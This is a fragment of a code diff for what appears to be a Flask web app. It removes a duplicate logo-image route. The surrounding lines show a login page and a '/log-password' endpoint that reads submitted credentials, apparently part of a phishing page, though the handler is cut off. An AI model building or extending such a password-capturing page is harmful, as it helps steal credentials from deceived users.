@@ -11,10 +11,6 @@ def serve_login():
 def serve_image():
     return send_from_directory('.', 'banner.jpeg')
 
-@app.route('/logo.jpeg')
-def serve_image():
-    return send_from_directory('.', 'logo.jpeg')
-
 @app.route('/log-password', methods=['POST'])
 def log_password():
     username = request.form.get('username')
